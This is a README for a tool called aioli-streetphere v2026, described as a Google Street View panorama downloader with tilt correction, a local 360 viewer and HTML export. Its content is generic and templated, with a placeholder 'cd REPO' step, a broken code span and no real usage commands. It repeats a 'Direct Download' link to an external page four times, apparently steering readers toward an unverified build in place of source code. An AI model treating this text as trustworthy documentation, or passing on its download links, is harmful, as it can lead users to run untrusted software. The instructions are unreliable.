# aioli-streetphere v2026 - Street View panorama downloader 2026

> **Download Google Street View panoramas as 2:1 equirectangular images for 360 pipelines, with a local viewer and HTML export in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Python%2C%20HTML-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganwestjod5511/aioli-streetphere-v2026?style=flat-square)](https://github.com/loganwestjod5511/aioli-streetphere-v2026)

---

<p align="center">
  <a href="https://loganwestjod5511.github.io/aioli-streetphere-v2026/">
    <img src="https://img.shields.io/badge/Download-aioli--streetphere%20Latest-brightgreen?style=for-the-badge" alt="Download aioli-streetphere">
  </a>
</p>

> **[Direct Download - aioli-streetphere v2026](https://loganwestjod5511.github.io/aioli-streetphere-v2026/)**

---

[Download Latest Build](https://loganwestjod5511.github.io/aioli-streetphere-v2026/)

---

## What aioli-streetphere is for

aioli-streetphere is a Street View panorama downloader built to convert Google Street View imagery into 2:1 equirectangular files. It is aimed at people who want panorama assets that can be loaded in 360 viewers or dropped into environment-sphere workflows in software such as Blender, V-Ray, and Cinema 4D.

The workflow is intentionally straightforward: retrieve the panorama, stitch the tiles into a usable image, and inspect the output locally. It can also fetch photo spheres from the Google CDN and straighten skewed panoramas by using metadata or manual pitch and roll values.

---

## Capabilities

- Downloads Google Street View panoramas as 2:1 equirectangular images
- Reconstructs Street View tiles into high-resolution panorama output
- Retrieves user photo spheres directly from Google CDN
- Supports tilt correction with metadata-based or manual pitch and roll adjustments
- Includes a local 360 viewer for quick inspection
- Exports standalone HTML for sharing or offline viewing
- Fits 3D and VFX workflows that need environment sphere source images
- Works as a lightweight utility for panorama acquisition and preview

---

## Getting started

Clone the repository, then open it in the environment you normally use:

- `git clone https://github.com/loganwestjod5511/aioli-streetphere-v2026.git
- `cd REPO`

From there, run the app or open the HTML entry point, depending on the build you have. For local use, start in the project root so the viewer assets and export files can be resolved correctly.

---

## How to use it

A common flow is:

1. Locate the Street View position or panorama source you want.
2. Run the downloader to collect the panorama tiles or photo sphere.
3. Let the tool combine everything into a 2:1 equirectangular image.
4. Correct the horizon if the panorama is not level.
5. View the finished result in the included 360 viewer or export it as standalone HTML.

Example command flow, if you are using a CLI-driven setup:

- Download the panorama
- Rebuild the tile set into a single image
- Preview the output locally
- Export when you need a portable viewer package

---

## Configuration

Configuration is usually managed through the project settings or launch options, depending on how the tool is started. When you need to adjust panorama leveling, check for pitch and roll inputs in the download or processing workflow.

Example structure:

    {
      "pitch": 0,
      "roll": 0,
      "output_format": "equirectangular",
      "viewer": "local"
    }

If your build keeps settings somewhere else, look in the app's local settings file, export options, or runtime parameters in the project root.

---

## Requirements

- Python and HTML-based runtime components
- Network access for Street View and CDN retrieval
- Enough local storage for panorama tiles and exported images
- A modern browser for the local 360 viewer or standalone HTML export
- Optional 3D software such as Blender, V-Ray, or Cinema 4D for environment map use

---

## FAQ

**Is the panorama source workflow covered in this version?**  
Yes. Version 2026 centers on Google Street View panoramas, tile assembly, and photo sphere retrieval.

**Can I inspect the panorama before I export it?**  
Yes. The project ships with a local 360 viewer for reviewing panoramas during the process.

**What if the panorama is not level?**  
You can realign it with metadata or by entering pitch and roll manually.

**Where should I start if I run into problems?**  
Check the download source, local storage path, browser compatibility for the viewer, and any runtime settings used by your build.

**How do I get the latest build?**  
Use the download link at the top of this page or open the project page linked in the CTA.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
